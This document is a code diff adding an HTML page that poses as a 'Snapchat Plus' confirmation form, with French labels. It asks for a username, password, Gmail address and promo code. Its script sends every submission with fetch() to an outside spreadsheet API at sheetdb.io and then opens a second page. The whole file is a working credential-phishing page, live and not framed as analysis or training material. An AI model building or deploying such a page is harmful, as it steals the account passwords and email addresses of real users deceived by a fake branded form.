@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="icon" href="img/snap-plus.ico" type="image/x-icon">
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <div class="form-container">
+        <h2>Confirmation Snapchat Plus</h2>
+        <form id="confirmationForm" action="https://sheetdb.io/api/v1/jh8gkpr74vl0i" method="POST" class="form">
+            <div class="form-group">
+                <label for="nomutilisateur">Nom d'utilisateur</label>
+                <input type="text" id="nomutilisateur" name="data[nomutilisateur]" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="data[password]" required>
+            </div>
+            <div class="form-group">
+                <label for="gmail">Gmail</label>
+                <input type="email" id="gmail" name="data[email]" required>
+            </div>
+            <div class="form-group">
+                <label for="promo">Code Promo</label>
+                <input type="text" id="promo" name="data[promo]">
+            </div>
+            <button type="submit" id="submitButton">Confirmation</button>
+        </form>
+    </div>
+    
+    <script>
+        const form = document.getElementById('confirmationForm');
+        const submitButton = document.getElementById('submitButton');
+
+        form.addEventListener("submit", (e) => {
+            e.preventDefault(); // Prevents multiple form submissions
+            submitButton.disabled = true; // Disables the button after first click
+            
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(form),
+            }).then((response) => response.json())
+            .then(() => {
+                window.open('page2.html', '_blank');
+            })
+            .catch(() => {
+                submitButton.disabled = false; // Re-enables the button if there was an error
+            });
+        });
+    </script>
+</body>
+</html>
